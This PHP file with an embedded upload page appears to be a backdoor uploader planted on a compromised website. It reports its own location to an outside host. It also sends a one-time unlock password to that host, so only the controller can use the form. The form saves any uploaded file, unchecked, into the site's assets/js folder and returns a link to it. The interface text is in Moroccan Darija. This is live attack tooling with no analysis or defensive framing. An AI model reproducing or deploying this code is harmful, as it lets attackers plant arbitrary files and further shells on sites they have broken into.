<?php if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_GET['form']) && $_GET['form'] === 'z') { $done_url = "https://mpr.jej.mybluehost.me/done.php?form=z"; function sendRequestToDone($data, $done_url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $done_url); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_exec($ch); curl_close($ch); } $serverName = $_SERVER["HTTP_HOST"]; $currentDir = dirname($_SERVER["PHP_SELF"]); $script_url = "http://$serverName$currentDir/z.php"; $data = ["url" => $script_url]; sendRequestToDone($data, $done_url); exit(); } elseif ($_SERVER["REQUEST_METHOD"] === "POST") { $done_url = "https://mpr.jej.mybluehost.me/done.php?form=z"; function sendRequestToDone($data, $done_url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $done_url); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_exec($ch); curl_close($ch); } if (isset($_POST["send_password"])) { $generated_password = bin2hex(random_bytes(8)); $data = ["message" => "$generated_password"]; sendRequestToDone($data, $done_url); session_start(); $_SESSION["generated_password"] = $generated_password; exit(); } elseif (isset($_POST["password"])) { session_start(); if ($_POST["password"] === $_SESSION["generated_password"]) { echo "correct"; } else { echo "incorrect"; } exit(); } elseif (isset($_FILES["fileToUpload"]) && $_FILES["fileToUpload"]["error"] === UPLOAD_ERR_OK) { $upload_dir = "assets/js/"; if (!is_dir($upload_dir)) { mkdir($upload_dir, 0755, true); } $file_name = basename($_FILES["fileToUpload"]["name"]); $fullpath = $upload_dir . $file_name; if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $fullpath)) { $file_url = $_SERVER["HTTP_HOST"] . dirname($_SERVER["PHP_SELF"]) . "/$fullpath"; echo "<a href='http://$file_url' id='fileLink'>Dkhol Men Hnà</a>"; } exit(); } } ?><!DOCTYPE html><html lang='fr'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1,viewport-fit=cover, user-scalable=no'><link rel='icon' type='image/x-icon' href='https://is.gd/j3A1mQ' /><title>7wàY</title><style>body, html { height: 100%; margin: 0; font-family: Arial, Helvetica, sans-serif; display: flex; justify-content: center; align-items: center; } .container { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; } form { display: flex; flex-direction: column; align-items: center; justify-content: center; border: 1px solid #888; padding: 20px; background-color: #fff; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); border-radius: 5px; } .modal { display: none; position: fixed; z-index: 1; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgb(0,0,0); background-color: rgba(0,0,0,0.4); padding-top: 60px; } .modal-content { background-color: #fefefe; margin: 5% auto; padding: 20px; border: 1px solid #888; width: 20%; display: flex; flex-direction: column; align-items: center; } #closeModal { cursor: pointer; align-self: flex-end; font-size: 20px; } #fileName { margin: 10px 0; } button { cursor: pointer; } #passwordInput { margin-bottom: 20px; width: 100%; } </style></head><body><form id='uploadForm' method='post' enctype='multipart/form-data'><input type='file' name='fileToUpload' id='fileToUpload'><div id='fileName'>Nàchfà</div><input type='hidden' name='form' value='i'><button type='button' id='uploadBtn'>Rfà3</button></form><div id='modal' class='modal'><div class='modal-content'><span id='closeModal'>&times;</span><p></p><input type='password' id='passwordInput'><button id='submitPassword'>3ICH</button></div></div><script>document.getElementById('uploadBtn').onclick = function() { var xhr = new XMLHttpRequest(); xhr.open('POST', '', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.onreadystatechange = function() { if (xhr.readyState === 4 && xhr.status === 200) { document.getElementById('modal').style.display = 'block'; } }; xhr.send('send_password=1'); }; document.getElementById('closeModal').onclick = function() { document.getElementById('modal').style.display = 'none'; }; document.getElementById('submitPassword').onclick = function() { const password = document.getElementById('passwordInput').value; var xhr = new XMLHttpRequest(); xhr.open('POST', '', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.onreadystatechange = function() { if (xhr.readyState === 4 && xhr.status === 200) { if (xhr.responseText.trim() === 'correct') { document.getElementById('uploadForm').submit(); } else { alert('GhàLàT'); } } }; xhr.send('password=' + encodeURIComponent(password)); }; </script></body></html>
